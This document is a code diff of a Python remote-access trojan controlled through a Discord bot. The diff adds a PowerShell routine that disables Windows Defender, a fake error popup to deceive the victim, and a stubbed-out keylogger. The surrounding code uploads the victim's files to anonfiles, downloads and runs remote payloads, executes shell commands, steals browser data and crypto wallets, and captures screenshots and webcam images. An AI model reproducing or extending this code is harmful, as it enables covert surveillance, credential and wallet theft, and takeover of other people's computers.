@@ -1,11 +1,30 @@
 import os, discord, subprocess, requests, ctypes, sys, zipfile
 from PIL import ImageGrab, Image
 import cv2
-from config import TOKEN, GUILD_ID
+from tkinter import messagebox
+from config import TOKEN, GUILD_ID, DEFENDER, ERROR
 from modules.browser import run, delete_files
-#from browser_stealer import run, delete_files
+#from modules.keylogger import Keylogger
 from dotenv import load_dotenv
 
+
+def disable_defender():
+    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
+    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
+    try:
+        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+    except:
+        pass
+    
+if DEFENDER:
+    disable_defender()
+
+
+def error():
+    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
+    
+if ERROR:
+    error()
 
 load_dotenv()
 login = os.getlogin()
@@ -27,6 +46,7 @@ commands = "\n".join([
     "browser - Get browser data",
     "webcam - Get image of webcam",
     "wallet - Get wallet information",
+    #"keylogger - Enable keylogger"
     "!exit - Exit session and delete all data"
 ])
 
@@ -115,7 +135,7 @@ async def on_ready():
     guild = client.get_guild(int(GUILD_ID))
     channel = await guild.create_text_channel(session_id)
     ip_address = requests.get("https://ipapi.co/json/").json()
-    data= ip_address['country_name'], ip_address['ip']
+    data = ip_address['country_name'], ip_address['ip']
     embed = discord.Embed(title="New session created", description="", color=0xfafafa)
     embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
     embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
@@ -126,21 +146,21 @@ async def on_ready():
     
 @client.event
 async def on_message(message):    
-    if message.author == client.user or message.channel.name != session_id:
+    if message.author == client.user: #if message.author == client.user or message.channel.name != session_id:
         return
 
-    #if message.channel.name != session_id:
-    #    return
+    if message.channel.name != session_id:
+        return
 
     if message.content == "help":
         embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content == "ping":
+    elif message.content == "ping":
         msg = f"PONG, `{round(client.latency * 1000)}ms`"
         await message.reply(content=msg)
 
-    if message.content.startswith("cd"):
+    elif message.content.startswith("cd"):
         directory = message.content.split(" ")[1]
         try:
             os.chdir(directory)
@@ -149,18 +169,18 @@ async def on_message(message):
             embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content == "ls":
+    elif message.content == "ls":
         files = "\n".join(os.listdir())
         if files == "":
             files = "No Files Found"
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
         await message.reply(embed=embed)
         
-    if message.content == "cwd":
+    elif message.content == "cwd":
         embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}{os.path.basename(link)}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content.startswith("download"):
+    elif message.content.startswith("download"):
         file = message.content.split(" ")[1]
         try:
             link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
@@ -170,7 +190,7 @@ async def on_message(message):
             embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
             await message.reply(embed=embed)
 
-    if message.content.startswith("upload"):
+    elif message.content.startswith("upload"):
         link = message.content.split(" ")[1]
         file = requests.get(link).content
         with open(os.path.basename(link), "wb") as f:
@@ -178,7 +198,7 @@ async def on_message(message):
         embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}{os.path.basename(link)}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content.startswith("cmd"):
+    elif message.content.startswith("cmd"):
         command = message.content[4:]
         output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0].decode("utf-8")
         if output == "":
@@ -186,18 +206,18 @@ async def on_message(message):
         embed = discord.Embed(title=f"CMD > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
         await message.reply(embed=embed)
 
-    if message.content.startswith("run"):
+    elif message.content.startswith("run"):
         file = message.content.split(" ")[1]
         subprocess.Popen(file, shell=True)
         embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
         await message.reply(embed=embed)
     
-    if message.content.startswith("startup"):
+    elif message.content.startswith("startup"):
         await startup()
         await message.reply("Startup Enabled!")
         
         
-    if message.content == "bluescreen":
+    elif message.content == "bluescreen":
         await message.reply("Attempting...", delete_after = .1)
         ntdll = ctypes.windll.ntdll
         prev_value = ctypes.c_bool()
@@ -208,7 +228,7 @@ async def on_message(message):
         else:
             await message.reply("Blue Failed! :(")
 
-    if message.content == "screenshot":
+    elif message.content == "screenshot":
         try:
             screenshot = ImageGrab.grab(all_screens=True)
         except:
@@ -220,7 +240,7 @@ async def on_message(message):
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
 
-    if message.content == "webcam":
+    elif message.content == "webcam":
         try:
             cap = cv2.VideoCapture(0)
             x, frame = cap.read()
@@ -238,16 +258,27 @@ async def on_message(message):
         embed.set_image(url="attachment://webcam.png")
         await message.reply(embed=embed, file=webcam)
     
-    if message.content == "browser":
+    elif message.content == "browser":
         await browsers(message.channel)
 
-    if message.content == "wallet":
+    elif message.content == "wallet":
         await wallets(message.channel)
     
-    if message.content == "!exit":
+    elif message.content == "!exit":
         await message.channel.delete()
-        await client.close()    
+        await client.close()
 
+    #elif message.content == "keylogger":
+    #    try:
+    #        webhook = await message.channel.create_webhook(name="Keylogger").url
+    #        Keylogger(webhook).run()
+    #    except:
+    #        return
+        
+    else:
+        embed = discord.Embed(title="Error", description="```Unknown command!```", color=0xfafafa)
+        await message.reply(embed=embed)
+    
 try:
     client.run(TOKEN)
 except:
